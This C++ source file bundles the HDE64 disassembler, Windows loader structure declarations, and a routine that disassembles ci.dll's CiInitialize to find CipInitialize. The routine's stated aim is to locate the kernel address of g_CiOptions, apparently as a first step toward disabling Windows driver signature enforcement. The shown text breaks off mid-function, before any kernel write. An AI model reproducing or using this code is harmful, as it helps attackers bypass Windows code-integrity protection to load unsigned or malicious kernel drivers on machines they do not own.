#include <iostream>
#include <windows.h>

#ifndef _NTLDR_H
#define _NTLDR_H

// disable lint warnings for complete source code file
//lint -e416  Warning 416: Likely creation of out-of-bounds pointer
//lint -e801  Warning 801: Use of goto is deprecated
//lint -e701  Warning 701: Shift left of signed quantity (int)
//lint -e734  Warning 734: Loss of precision (assignment) (31 bits to 8 bits)
//lint -e744  Warning 744: switch statement has no default
//lint -e820  Warning 820: Boolean test of a parenthesized assignment
//lint -e826  Warning 826: Suspicious pointer-to-pointer conversion (area too small)
//lint -e830  Warning 830: Location cited in prior message
//lint -e850  Warning 850: for loop index variable 'ht' whose type category is 'string' is modified in body of the for loop
//lint -e952  Warning 952: Parameter could be declared const --- Eff. C++ 3rd Ed. item 3
//lint -e954  Warning 954: Pointer variable could be declared as pointing to const --- Eff. C++ 3rd Ed. item 3

/*
 * Hacker Disassembler Engine 64 C
 * Copyright (c) 2008-2009, Vyacheslav Patkov.
 * All rights reserved.
 *
 */

#include "hde64.h"
#include "table64.h"
#include "main.h"
#include<winternl.h>
// Warning C4706: assignment within conditional expression
#pragma warning(disable:4706)

unsigned int hde64_disasm(const void *code, hde64s *hs)
{
    uint8_t x, c = 0, *p = (uint8_t *)code, cflags, opcode, pref = 0;
    uint8_t *ht = hde64_table, m_mod, m_reg, m_rm, disp_size = 0;
    uint8_t op64 = 0;

    memset((LPBYTE)hs, 0, sizeof(hde64s));

    for (x = 16; x; x--)
        switch (c = *p++) {
            case 0xf3:
                hs->p_rep = c;
                pref |= PRE_F3;
                break;
            case 0xf2:
                hs->p_rep = c;
                pref |= PRE_F2;
                break;
            case 0xf0:
                hs->p_lock = c;
                pref |= PRE_LOCK;
                break;
            case 0x26: case 0x2e: case 0x36:
            case 0x3e: case 0x64: case 0x65:
                hs->p_seg = c;
                pref |= PRE_SEG;
                break;
            case 0x66:
                hs->p_66 = c;
                pref |= PRE_66;
                break;
            case 0x67:
                hs->p_67 = c;
                pref |= PRE_67;
                break;
            default:
                goto pref_done;
        }
    pref_done:

    hs->flags = (uint32_t)pref << 23;

    if (!pref)
        pref |= PRE_NONE;

    if ((c & 0xf0) == 0x40) {
        hs->flags |= F_PREFIX_REX;
        if ((hs->rex_w = (c & 0xf) >> 3) && (*p & 0xf8) == 0xb8)
            op64++;
        hs->rex_r = (c & 7) >> 2;
        hs->rex_x = (c & 3) >> 1;
        hs->rex_b = c & 1;
        if (((c = *p++) & 0xf0) == 0x40) {
            opcode = c;
            goto error_opcode;
        }
    }

    if ((hs->opcode = c) == 0x0f) {
        hs->opcode2 = c = *p++;
        ht += DELTA_OPCODES;
    } else if (c >= 0xa0 && c <= 0xa3) {
        op64++;
        if (pref & PRE_67)
            pref |= PRE_66;
        else
            pref &= ~PRE_66;
    }

    opcode = c;
    cflags = ht[ht[opcode / 4] + (opcode % 4)];

    if (cflags == C_ERROR) {
        error_opcode:
        hs->flags |= F_ERROR | F_ERROR_OPCODE;
        cflags = 0;
        if ((opcode & -3) == 0x24)
            cflags++;
    }

    x = 0;
    if (cflags & C_GROUP) {
        uint16_t t;
        t = *(uint16_t *)(ht + (cflags & 0x7f));
        cflags = (uint8_t)t;
        x = (uint8_t)(t >> 8);
    }

    if (hs->opcode2) {
        ht = hde64_table + DELTA_PREFIXES;
        if (ht[ht[opcode / 4] + (opcode % 4)] & pref)
            hs->flags |= F_ERROR | F_ERROR_OPCODE;
    }

    if (cflags & C_MODRM) {
        hs->flags |= F_MODRM;
        hs->modrm = c = *p++;
        hs->modrm_mod = m_mod = c >> 6;
        hs->modrm_rm = m_rm = c & 7;
        hs->modrm_reg = m_reg = (c & 0x3f) >> 3;

        if (x && ((x << m_reg) & 0x80))
            hs->flags |= F_ERROR | F_ERROR_OPCODE;

        if (!hs->opcode2 && opcode >= 0xd9 && opcode <= 0xdf) {
            uint8_t t = opcode - 0xd9;
            if (m_mod == 3) {
                ht = hde64_table + DELTA_FPU_MODRM + t*8;
                t = ht[m_reg] << m_rm;
            } else {
                ht = hde64_table + DELTA_FPU_REG;
                t = ht[t] << m_reg;
            }
            if (t & 0x80)
                hs->flags |= F_ERROR | F_ERROR_OPCODE;
        }

        if (pref & PRE_LOCK) {
            if (m_mod == 3) {
                hs->flags |= F_ERROR | F_ERROR_LOCK;
            } else {
                uint8_t *table_end, op = opcode;
                if (hs->opcode2) {
                    ht = hde64_table + DELTA_OP2_LOCK_OK;
                    table_end = ht + DELTA_OP_ONLY_MEM - DELTA_OP2_LOCK_OK;
                } else {
                    ht = hde64_table + DELTA_OP_LOCK_OK;
                    table_end = ht + DELTA_OP2_LOCK_OK - DELTA_OP_LOCK_OK;
                    op &= -2;
                }
                for (; ht != table_end; ht++)
                    if (*ht++ == op) {
                        if (!((*ht << m_reg) & 0x80))
                            goto no_lock_error;
                        else
                            break;
                    }
                hs->flags |= F_ERROR | F_ERROR_LOCK;
                no_lock_error:
                ;
            }
        }

        if (hs->opcode2) {
            switch (opcode) {
                case 0x20: case 0x22:
                    m_mod = 3;
                    if (m_reg > 4 || m_reg == 1)
                        goto error_operand;
                    else
                        goto no_error_operand;
                case 0x21: case 0x23:
                    m_mod = 3;
                    if (m_reg == 4 || m_reg == 5)
                        goto error_operand;
                    else
                        goto no_error_operand;
            }
        } else {
            switch (opcode) {
                case 0x8c:
                    if (m_reg > 5)
                        goto error_operand;
                    else
                        goto no_error_operand;
                case 0x8e:
                    if (m_reg == 1 || m_reg > 5)
                        goto error_operand;
                    else
                        goto no_error_operand;
            }
        }

        if (m_mod == 3) {
            uint8_t *table_end;
            if (hs->opcode2) {
                ht = hde64_table + DELTA_OP2_ONLY_MEM;
                table_end = ht + sizeof(hde64_table) - DELTA_OP2_ONLY_MEM;
            } else {
                ht = hde64_table + DELTA_OP_ONLY_MEM;
                table_end = ht + DELTA_OP2_ONLY_MEM - DELTA_OP_ONLY_MEM;
            }
            for (; ht != table_end; ht += 2)
                if (*ht++ == opcode) {
                    if ((*ht++ & pref) && !((*ht << m_reg) & 0x80))
                        goto error_operand;
                    else
                        break;
                }
            goto no_error_operand;
        } else if (hs->opcode2) {
            switch (opcode) {
                case 0x50: case 0xd7: case 0xf7:
                    if (pref & (PRE_NONE | PRE_66))
                        goto error_operand;
                    break;
                case 0xd6:
                    if (pref & (PRE_F2 | PRE_F3))
                        goto error_operand;
                    break;
                case 0xc5:
                    goto error_operand;
            }
            goto no_error_operand;
        } else
            goto no_error_operand;

        error_operand:
        hs->flags |= F_ERROR | F_ERROR_OPERAND;
        no_error_operand:

        c = *p++;
        if (m_reg <= 1) {
            if (opcode == 0xf6)
                cflags |= C_IMM8;
            else if (opcode == 0xf7)
                cflags |= C_IMM_P66;
        }

        switch (m_mod) {
            case 0:
                if (pref & PRE_67) {
                    if (m_rm == 6)
                        disp_size = 2;
                } else
                if (m_rm == 5)
                    disp_size = 4;
                break;
            case 1:
                disp_size = 1;
                break;
            case 2:
                disp_size = 2;
                if (!(pref & PRE_67))
                    disp_size <<= 1;
                break;
        }

        if (m_mod != 3 && m_rm == 4) {
            hs->flags |= F_SIB;
            p++;
            hs->sib = c;
            hs->sib_scale = c >> 6;
            hs->sib_index = (c & 0x3f) >> 3;
            if ((hs->sib_base = c & 7) == 5 && !(m_mod & 1))
                disp_size = 4;
        }

        p--;
        switch (disp_size) {
            case 1:
                hs->flags |= F_DISP8;
                hs->disp.disp8 = *p;
                break;
            case 2:
                hs->flags |= F_DISP16;
                hs->disp.disp16 = *(uint16_t *)p;
                break;
            case 4:
                hs->flags |= F_DISP32;
                hs->disp.disp32 = *(uint32_t *)p;
                break;
        }
        p += disp_size;
    } else if (pref & PRE_LOCK)
        hs->flags |= F_ERROR | F_ERROR_LOCK;

    if (cflags & C_IMM_P66) {
        if (cflags & C_REL32) {
            if (pref & PRE_66) {
                hs->flags |= F_IMM16 | F_RELATIVE;
                hs->imm.imm16 = *(uint16_t *)p;
                p += 2;
                goto disasm_done;
            }
            goto rel32_ok;
        }
        if (op64) {
            hs->flags |= F_IMM64;
            hs->imm.imm64 = *(uint64_t *)p;
            p += 8;
        } else if (!(pref & PRE_66)) {
            hs->flags |= F_IMM32;
            hs->imm.imm32 = *(uint32_t *)p;
            p += 4;
        } else
            goto imm16_ok;
    }


    if (cflags & C_IMM16) {
        imm16_ok:
        hs->flags |= F_IMM16;
        hs->imm.imm16 = *(uint16_t *)p;
        p += 2;
    }
    if (cflags & C_IMM8) {
        hs->flags |= F_IMM8;
        hs->imm.imm8 = *p++;
    }

    if (cflags & C_REL32) {
        rel32_ok:
        hs->flags |= F_IMM32 | F_RELATIVE;
        hs->imm.imm32 = *(uint32_t *)p;
        p += 4;
    } else if (cflags & C_REL8) {
        hs->flags |= F_IMM8 | F_RELATIVE;
        hs->imm.imm8 = *p++;
    }

    disasm_done:

    if ((hs->len = (uint8_t)(p-(uint8_t *)code)) > 15) {
        hs->flags |= F_ERROR | F_ERROR_LENGTH;
        hs->len = 15;
    }

    return (unsigned int)hs->len;
}


#if (PHNT_MODE != PHNT_MODE_KERNEL)

// DLLs

// symbols
typedef struct _LDR_SERVICE_TAG_RECORD
{
    struct _LDR_SERVICE_TAG_RECORD *Next;
    ULONG ServiceTag;
} LDR_SERVICE_TAG_RECORD, *PLDR_SERVICE_TAG_RECORD;

// symbols
typedef struct _LDRP_CSLIST
{
    PSINGLE_LIST_ENTRY Tail;
} LDRP_CSLIST, *PLDRP_CSLIST;

// symbols
typedef enum _LDR_DDAG_STATE
{
    LdrModulesMerged = -5,
    LdrModulesInitError = -4,
    LdrModulesSnapError = -3,
    LdrModulesUnloaded = -2,
    LdrModulesUnloading = -1,
    LdrModulesPlaceHolder = 0,
    LdrModulesMapping = 1,
    LdrModulesMapped = 2,
    LdrModulesWaitingForDependencies = 3,
    LdrModulesSnapping = 4,
    LdrModulesSnapped = 5,
    LdrModulesCondensed = 6,
    LdrModulesReadyToInit = 7,
    LdrModulesInitializing = 8,
    LdrModulesReadyToRun = 9
} LDR_DDAG_STATE;

// symbols
typedef struct _LDR_DDAG_NODE
{
    LIST_ENTRY Modules;
    PLDR_SERVICE_TAG_RECORD ServiceTagList;
    ULONG LoadCount;
    ULONG ReferenceCount;
    ULONG DependencyCount;
    union
    {
        LDRP_CSLIST Dependencies;
        SINGLE_LIST_ENTRY RemovalLink;
    };
    LDRP_CSLIST IncomingDependencies;
    LDR_DDAG_STATE State;
    SINGLE_LIST_ENTRY CondenseLink;
    ULONG PreorderNumber;
    ULONG LowestLink;
} LDR_DDAG_NODE, *PLDR_DDAG_NODE;

// rev
typedef struct _LDR_DEPENDENCY_RECORD
{
    SINGLE_LIST_ENTRY DependencyLink;
    PLDR_DDAG_NODE DependencyNode;
    SINGLE_LIST_ENTRY IncomingDependencyLink;
    PLDR_DDAG_NODE IncomingDependencyNode;
} LDR_DEPENDENCY_RECORD, *PLDR_DEPENDENCY_RECORD;

// symbols
typedef enum _LDR_DLL_LOAD_REASON
{
    LoadReasonStaticDependency,
    LoadReasonStaticForwarderDependency,
    LoadReasonDynamicForwarderDependency,
    LoadReasonDelayloadDependency,
    LoadReasonDynamicLoad,
    LoadReasonAsImageLoad,
    LoadReasonAsDataLoad,
    LoadReasonUnknown = -1
} LDR_DLL_LOAD_REASON, *PLDR_DLL_LOAD_REASON;

#define LDRP_PACKAGED_BINARY 0x00000001
#define LDRP_IMAGE_DLL 0x00000004
#define LDRP_LOAD_IN_PROGRESS 0x00001000
#define LDRP_ENTRY_PROCESSED 0x00004000
#define LDRP_DONT_CALL_FOR_THREADS 0x00040000
#define LDRP_PROCESS_ATTACH_CALLED 0x00080000
#define LDRP_PROCESS_ATTACH_FAILED 0x00100000
#define LDRP_IMAGE_NOT_AT_BASE 0x00200000 // Vista and below
#define LDRP_COR_IMAGE 0x00400000
#define LDRP_DONT_RELOCATE 0x00800000
#define LDRP_REDIRECTED 0x10000000
#define LDRP_COMPAT_DATABASE_PROCESSED 0x80000000

// Use the size of the structure as it was in Windows XP.
#define LDR_DATA_TABLE_ENTRY_SIZE_WINXP FIELD_OFFSET(LDR_DATA_TABLE_ENTRY, DdagNode)
#define LDR_DATA_TABLE_ENTRY_SIZE_WIN7 FIELD_OFFSET(LDR_DATA_TABLE_ENTRY, BaseNameHashValue)
#define LDR_DATA_TABLE_ENTRY_SIZE_WIN8 FIELD_OFFSET(LDR_DATA_TABLE_ENTRY, ImplicitPathOptions)

// symbols
typedef struct _LDR_DATA_TABLE_ENTRY
{
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    union
    {
        LIST_ENTRY InInitializationOrderLinks;
        LIST_ENTRY InProgressLinks;
    };
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    union
    {
        UCHAR FlagGroup[4];
        ULONG Flags;
        struct
        {
            ULONG PackagedBinary : 1;
            ULONG MarkedForRemoval : 1;
            ULONG ImageDll : 1;
            ULONG LoadNotificationsSent : 1;
            ULONG TelemetryEntryProcessed : 1;
            ULONG ProcessStaticImport : 1;
            ULONG InLegacyLists : 1;
            ULONG InIndexes : 1;
            ULONG ShimDll : 1;
            ULONG InExceptionTable : 1;
            ULONG ReservedFlags1 : 2;
            ULONG LoadInProgress : 1;
            ULONG LoadConfigProcessed : 1;
            ULONG EntryProcessed : 1;
            ULONG ProtectDelayLoad : 1;
            ULONG ReservedFlags3 : 2;
            ULONG DontCallForThreads : 1;
            ULONG ProcessAttachCalled : 1;
            ULONG ProcessAttachFailed : 1;
            ULONG CorDeferredValidate : 1;
            ULONG CorImage : 1;
            ULONG DontRelocate : 1;
            ULONG CorILOnly : 1;
            ULONG ReservedFlags5 : 3;
            ULONG Redirected : 1;
            ULONG ReservedFlags6 : 2;
            ULONG CompatDatabaseProcessed : 1;
        };
    };
    USHORT ObsoleteLoadCount;
    USHORT TlsIndex;
    LIST_ENTRY HashLinks;
    ULONG TimeDateStamp;
    struct _ACTIVATION_CONTEXT *EntryPointActivationContext;
    PVOID Lock;
    PLDR_DDAG_NODE DdagNode;
    LIST_ENTRY NodeModuleLink;
    struct _LDRP_LOAD_CONTEXT *LoadContext;
    PVOID ParentDllBase;
    PVOID SwitchBackContext;
    RTL_BALANCED_NODE BaseAddressIndexNode;
    RTL_BALANCED_NODE MappingInfoIndexNode;
    ULONG_PTR OriginalBase;
    LARGE_INTEGER LoadTime;
    ULONG BaseNameHashValue;
    LDR_DLL_LOAD_REASON LoadReason;
    ULONG ImplicitPathOptions;
    ULONG ReferenceCount;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef BOOLEAN (NTAPI *PDLL_INIT_ROUTINE)(
    _In_ PVOID DllHandle,
    _In_ ULONG Reason,
    _In_opt_ PCONTEXT Context
    );

NTSYSAPI
NTSTATUS
NTAPI
LdrLoadDll(
    _In_opt_ PWSTR DllPath,
    _In_opt_ PULONG DllCharacteristics,
    _In_ PUNICODE_STRING DllName,
    _Out_ PVOID *DllHandle
    );

NTSYSAPI
NTSTATUS
NTAPI
LdrUnloadDll(
    _In_ PVOID DllHandle
    );

NTSYSAPI
NTSTATUS
NTAPI
LdrGetDllHandle(
    _In_opt_ PWSTR DllPath,
    _In_opt_ PULONG DllCharacteristics,
    _In_ PUNICODE_STRING DllName,
    _Out_ PVOID *DllHandle
    );

#define LDR_GET_DLL_HANDLE_EX_UNCHANGED_REFCOUNT 0x00000001
#define LDR_GET_DLL_HANDLE_EX_PIN 0x00000002

NTSYSAPI
NTSTATUS
NTAPI
LdrGetDllHandleEx(
    _In_ ULONG Flags,
    _In_opt_ PCWSTR DllPath,
    _In_opt_ PULONG DllCharacteristics,
    _In_ PUNICODE_STRING DllName,
    _Out_opt_ PVOID *DllHandle
    );

#if (PHNT_VERSION >= PHNT_WIN7)
// rev
NTSYSAPI
NTSTATUS
NTAPI
LdrGetDllHandleByMapping(
    _In_ PVOID Base,
    _Out_ PVOID *DllHandle
    );
#endif

#if (PHNT_VERSION >= PHNT_WIN7)
// rev
NTSYSAPI
NTSTATUS
NTAPI
LdrGetDllHandleByName(
    _In_opt_ PUNICODE_STRING BaseDllName,
    _In_opt_ PUNICODE_STRING FullDllName,
    _Out_ PVOID *DllHandle
    );
#endif

#define LDR_ADDREF_DLL_PIN 0x00000001

NTSYSAPI
NTSTATUS
NTAPI
LdrAddRefDll(
    _In_ ULONG Flags,
    _In_ PVOID DllHandle
    );

NTSYSAPI
NTSTATUS
NTAPI
LdrGetProcedureAddress(
    _In_ PVOID DllHandle,
    _In_opt_ PANSI_STRING ProcedureName,
    _In_opt_ ULONG ProcedureNumber,
    _Out_ PVOID *ProcedureAddress
    );

// rev
#define LDR_GET_PROCEDURE_ADDRESS_DONT_RECORD_FORWARDER 0x00000001

#if (PHNT_VERSION >= PHNT_VISTA)
// private
NTSYSAPI
NTSTATUS
NTAPI
LdrGetProcedureAddressEx(
    _In_ PVOID DllHandle,
    _In_opt_ PANSI_STRING ProcedureName,
    _In_opt_ ULONG ProcedureNumber,
    _Out_ PVOID *ProcedureAddress,
    _In_ ULONG Flags
    );
#endif

#define LDR_LOCK_LOADER_LOCK_FLAG_RAISE_ON_ERRORS 0x00000001
#define LDR_LOCK_LOADER_LOCK_FLAG_TRY_ONLY 0x00000002

#define LDR_LOCK_LOADER_LOCK_DISPOSITION_INVALID 0
#define LDR_LOCK_LOADER_LOCK_DISPOSITION_LOCK_ACQUIRED 1
#define LDR_LOCK_LOADER_LOCK_DISPOSITION_LOCK_NOT_ACQUIRED 2

NTSYSAPI
NTSTATUS
NTAPI
LdrLockLoaderLock(
    _In_ ULONG Flags,
    _Out_opt_ ULONG *Disposition,
    _Out_ PVOID *Cookie
    );

#define LDR_UNLOCK_LOADER_LOCK_FLAG_RAISE_ON_ERRORS 0x00000001

NTSYSAPI
NTSTATUS
NTAPI
LdrUnlockLoaderLock(
    _In_ ULONG Flags,
    _Inout_ PVOID Cookie
    );

NTSYSAPI
NTSTATUS
NTAPI
LdrRelocateImage(
    _In_ PVOID NewBase,
    _In_ PSTR LoaderName,
    _In_ NTSTATUS Success,
    _In_ NTSTATUS Conflict,
    _In_ NTSTATUS Invalid
    );

NTSYSAPI
NTSTATUS
NTAPI
LdrRelocateImageWithBias(
    _In_ PVOID NewBase,
    _In_ LONGLONG Bias,
    _In_ PSTR LoaderName,
    _In_ NTSTATUS Success,
    _In_ NTSTATUS Conflict,
    _In_ NTSTATUS Invalid
    );

NTSYSAPI
PIMAGE_BASE_RELOCATION
NTAPI
LdrProcessRelocationBlock(
    _In_ ULONG_PTR VA,
    _In_ ULONG SizeOfBlock,
    _In_ PUSHORT NextOffset,
    _In_ LONG_PTR Diff
    );

NTSYSAPI
BOOLEAN
NTAPI
LdrVerifyMappedImageMatchesChecksum(
    _In_ PVOID BaseAddress,
    _In_ SIZE_T NumberOfBytes,
    _In_ ULONG FileLength
    );

typedef VOID (NTAPI *PLDR_IMPORT_MODULE_CALLBACK)(
    _In_ PVOID Parameter,
    _In_ PSTR ModuleName
    );

NTSYSAPI
NTSTATUS
NTAPI
LdrVerifyImageMatchesChecksum(
    _In_ HANDLE ImageFileHandle,
    _In_opt_ PLDR_IMPORT_MODULE_CALLBACK ImportCallbackRoutine,
    _In_ PVOID ImportCallbackParameter,
    _Out_opt_ PUSHORT ImageCharacteristics
    );

// private
typedef struct _LDR_IMPORT_CALLBACK_INFO
{
    PLDR_IMPORT_MODULE_CALLBACK ImportCallbackRoutine;
    PVOID ImportCallbackParameter;
} LDR_IMPORT_CALLBACK_INFO, *PLDR_IMPORT_CALLBACK_INFO;

// private
typedef struct _LDR_SECTION_INFO
{
    HANDLE SectionHandle;
    ACCESS_MASK DesiredAccess;
    POBJECT_ATTRIBUTES ObjA;
    ULONG SectionPageProtection;
    ULONG AllocationAttributes;
} LDR_SECTION_INFO, *PLDR_SECTION_INFO;

// private
typedef struct _LDR_VERIFY_IMAGE_INFO
{
    ULONG Size;
    ULONG Flags;
    LDR_IMPORT_CALLBACK_INFO CallbackInfo;
    LDR_SECTION_INFO SectionInfo;
    USHORT ImageCharacteristics;
} LDR_VERIFY_IMAGE_INFO, *PLDR_VERIFY_IMAGE_INFO;

#if (PHNT_VERSION >= PHNT_VISTA)
// private
NTSYSAPI
NTSTATUS
NTAPI
LdrVerifyImageMatchesChecksumEx(
    _In_ HANDLE ImageFileHandle,
    _Inout_ PLDR_VERIFY_IMAGE_INFO VerifyInfo
    );
#endif

#if (PHNT_VERSION >= PHNT_VISTA)
// private
NTSYSAPI
NTSTATUS
NTAPI
LdrQueryModuleServiceTags(
    _In_ PVOID DllHandle,
    _Out_writes_(*BufferSize) PULONG ServiceTagBuffer,
    _Inout_ PULONG BufferSize
    );
#endif

// begin_msdn:"DLL Load Notification"

#define LDR_DLL_NOTIFICATION_REASON_LOADED 1
#define LDR_DLL_NOTIFICATION_REASON_UNLOADED 2

typedef struct _LDR_DLL_LOADED_NOTIFICATION_DATA
{
    ULONG Flags;
    PUNICODE_STRING FullDllName;
    PUNICODE_STRING BaseDllName;
    PVOID DllBase;
    ULONG SizeOfImage;
} LDR_DLL_LOADED_NOTIFICATION_DATA, *PLDR_DLL_LOADED_NOTIFICATION_DATA;

typedef struct _LDR_DLL_UNLOADED_NOTIFICATION_DATA
{
    ULONG Flags;
    PCUNICODE_STRING FullDllName;
    PCUNICODE_STRING BaseDllName;
    PVOID DllBase;
    ULONG SizeOfImage;
} LDR_DLL_UNLOADED_NOTIFICATION_DATA, *PLDR_DLL_UNLOADED_NOTIFICATION_DATA;

typedef union _LDR_DLL_NOTIFICATION_DATA
{
    LDR_DLL_LOADED_NOTIFICATION_DATA Loaded;
    LDR_DLL_UNLOADED_NOTIFICATION_DATA Unloaded;
} LDR_DLL_NOTIFICATION_DATA, *PLDR_DLL_NOTIFICATION_DATA;

typedef VOID (NTAPI *PLDR_DLL_NOTIFICATION_FUNCTION)(
    _In_ ULONG NotificationReason,
    _In_ PLDR_DLL_NOTIFICATION_DATA NotificationData,
    _In_opt_ PVOID Context
    );

#if (PHNT_VERSION >= PHNT_VISTA)

NTSYSAPI
NTSTATUS
NTAPI
LdrRegisterDllNotification(
    _In_ ULONG Flags,
    _In_ PLDR_DLL_NOTIFICATION_FUNCTION NotificationFunction,
    _In_ PVOID Context,
    _Out_ PVOID *Cookie
    );

NTSYSAPI
NTSTATUS
NTAPI
LdrUnregisterDllNotification(
    _In_ PVOID Cookie
    );

#endif

// end_msdn

// Load as data table

#if (PHNT_VERSION >= PHNT_VISTA)

// private
NTSYSAPI
NTSTATUS
NTAPI
LdrAddLoadAsDataTable(
    _In_ PVOID Module,
    _In_ PWSTR FilePath,
    _In_ SIZE_T Size,
    _In_ HANDLE Handle
    );

// private
NTSYSAPI
NTSTATUS
NTAPI
LdrRemoveLoadAsDataTable(
    _In_ PVOID InitModule,
    _Out_opt_ PVOID *BaseModule,
    _Out_opt_ PSIZE_T Size,
    _In_ ULONG Flags
    );

// private
NTSYSAPI
NTSTATUS
NTAPI
LdrGetFileNameFromLoadAsDataTable(
    _In_ PVOID Module,
    _Out_ PVOID *pFileNamePrt
    );

#endif

#endif // (PHNT_MODE != PHNT_MODE_KERNEL)

// Module information

typedef struct _RTL_PROCESS_MODULE_INFORMATION
{
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES
{
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

// private
typedef struct _RTL_PROCESS_MODULE_INFORMATION_EX
{
    USHORT NextOffset;
    RTL_PROCESS_MODULE_INFORMATION BaseInfo;
    ULONG ImageChecksum;
    ULONG TimeDateStamp;
    PVOID DefaultBase;
} RTL_PROCESS_MODULE_INFORMATION_EX, *PRTL_PROCESS_MODULE_INFORMATION_EX;

#endif


int MyRtlGetVersion(OSVERSIONINFO *osvi)
{
    // zero OSVERSIONINFO memory and set OSVERSIONINFO size
    ZeroMemory(osvi,sizeof(OSVERSIONINFO));
    osvi->dwOSVersionInfoSize = sizeof(OSVERSIONINFO);

    // get handle to ntdll.dll
    HINSTANCE hLib = LoadLibrary("ntdll.dll");
    if(hLib == NULL)
    {
        return 1;
    }
    typedef NTSTATUS (*RtlGetVersionProc)(PRTL_OSVERSIONINFOW lpVersionInformation);

    // retrieve address of exported function NtQuerySystemInformation
    RtlGetVersionProc RtlGetVersion = (RtlGetVersionProc)GetProcAddress(hLib,"RtlGetVersion");
    if(RtlGetVersion == NULL)
    {
        FreeLibrary(hLib);
        return 2;
    }

    // get version information about the currently running operating system
    //lint -e{826} Warning 826: Suspicious pointer-to-pointer conversion (area too small)
    if(RtlGetVersion((PRTL_OSVERSIONINFOW)osvi) != 0)
    {
        FreeLibrary(hLib);
        return 3;
    }

    // free ntdll.dll library handle
    FreeLibrary(hLib);

    return 0;
}

UINT64 cidll_base;
UINT64 kernel_base;
UINT64 cidll_size;
UINT64 ciOptions;

int MyGetg_CiOptionsKernelAddress(UINT64 ui64ImageBase,DWORD dwBuildNumber)
{
    // zero kernel address of g_CiOptions

    // zero ci.dll file path
    char szCiDll[MAX_PATH];
    //lint -e{747} Warning 747: Significant prototype coercion (arg. no. 3) int to unsigned long long
    memset(szCiDll,0,MAX_PATH);

    // get system directory path
    if(GetSystemDirectory(szCiDll,MAX_PATH) == 0)
    {
        return 1;
    }

    // add file name of ci.dll
    lstrcat(szCiDll,"\\ci.dll");

    // load the module ci.dll into the address space of our process
    HMODULE hLib = LoadLibraryEx(szCiDll,NULL,DONT_RESOLVE_DLL_REFERENCES);
    if(hLib == NULL)
    {
        return 2;
    }

    // retrieve address of exported function CiInitialize
    BYTE *CiInitialize = NULL;
    //lint -e{611} Warning 611: Suspicious cast
    //lint -e{838} Warning 838: Previously assigned value to variable has not been used
    CiInitialize = (BYTE*)GetProcAddress(hLib,"CiInitialize");
    if(CiInitialize == NULL)
    {
        FreeLibrary(hLib);
        return 3;
    }

    // zero Hacker Disassembler Engine 64 structure
    hde64s hs;
    ZeroMemory(&hs,sizeof(hde64s));
    LONG CipInitializeOffset = 0;
    BYTE *CipInitialize = NULL;
    // Windows 8 up to Windows 10 Version 1703
    if(dwBuildNumber < 16299)
    {
        // search the first 0x48 bytes of the function CiInitialize for the "jmp CipInitialize" instruction
        // the function CiInitialize should never be more than 0x48 bytes in size for Windows 8.1 x64 Enterprise
        for(ULONG i = 0; i < 0x48; i += hs.len)
        {
            // disassemble code with Hacker Disassembler Engine 64
            //lint -e{534} Warning 534: Ignoring return value of function
            hde64_disasm(CiInitialize + i,&hs);
            // check for disassembler error
            if(hs.flags & F_ERROR)
            {
                FreeLibrary(hLib);
                return 4;
            }

            // we search for a jump instruction with a length of 5 bytes
            if(hs.len == 5 && CiInitialize[i] == 0xE9)
            {
                // If we get here we found the jump instruction to CipInitialize.

                // Windows 8 x64 Enterprise
                // PAGE:0000000080029290 ; Exported entry   6. CiInitialize
                // PAGE:0000000080029290
                // PAGE:0000000080029290 ; =============== S U B R O U T I N E =======================================
                // PAGE:0000000080029290
                // PAGE:0000000080029290
                // PAGE:0000000080029290                 public CiInitialize
                // PAGE:0000000080029290 CiInitialize    proc near
                // PAGE:0000000080029290
                // PAGE:0000000080029290 arg_0           = qword ptr  8
                // PAGE:0000000080029290 arg_8           = qword ptr  10h
                // PAGE:0000000080029290 arg_10          = qword ptr  18h
                // PAGE:0000000080029290
                // PAGE:0000000080029290                 mov     [rsp+arg_0], rbx
                // PAGE:0000000080029295                 mov     [rsp+arg_8], rbp
                // PAGE:000000008002929A                 mov     [rsp+arg_10], rsi
                // PAGE:000000008002929F                 push    rdi
                // PAGE:00000000800292A0                 sub     rsp, 20h
                // PAGE:00000000800292A4                 mov     rbx, r9
                // PAGE:00000000800292A7                 mov     rdi, r8
                // PAGE:00000000800292AA                 mov     rsi, rdx
                // PAGE:00000000800292AD                 mov     ebp, ecx
                // PAGE:00000000800292AF                 call    __security_init_cookie
                // PAGE:00000000800292B4                 mov     r9, rbx
                // PAGE:00000000800292B7                 mov     r8, rdi
                // PAGE:00000000800292BA                 mov     rdx, rsi
                // PAGE:00000000800292BD                 mov     ecx, ebp
                // PAGE:00000000800292BF                 mov     rbx, [rsp+28h+arg_0]
                // PAGE:00000000800292C4                 mov     rbp, [rsp+28h+arg_8]
                // PAGE:00000000800292C9                 mov     rsi, [rsp+28h+arg_10]
                // PAGE:00000000800292CE                 add     rsp, 20h
                // PAGE:00000000800292D2                 pop     rdi
                // PAGE:00000000800292D3                 jmp     CipInitialize
                // PAGE:00000000800292D3 CiInitialize    endp

                // Attention: It is important here that we use a LONG value and no DWORD value,
                // because the offsets in the disassembly are signed to also reach negative values.
                // In our case CipInitialize is below CiInitialize, therefore it would also work here
                // with a DWORD value, because the offset is positive.
                //lint -e{826} Warning 826: Suspicious pointer-to-pointer conversion (area too small)
                CipInitializeOffset = *(LONG*)((BYTE*)CiInitialize + i + 1);
                // calculate virtual address of function CipInitialize
                CipInitialize = (CiInitialize + i + 5 + CipInitializeOffset);
                // leave the for loop
                break;
            }
        }
    }
        // Windows 10 Version 1709 up to Windows 11 Build 22H2
    else
    {
        // number of instructions found
        ULONG ulInstructionsFound = 0;

        // search the first 0x6E bytes of the function CiInitialize for the "call CipInitialize" instruction
        // the function CiInitialize should never be more than 0x6E bytes in size for Windows 10 x64 Build 21H2 and Build 22H2
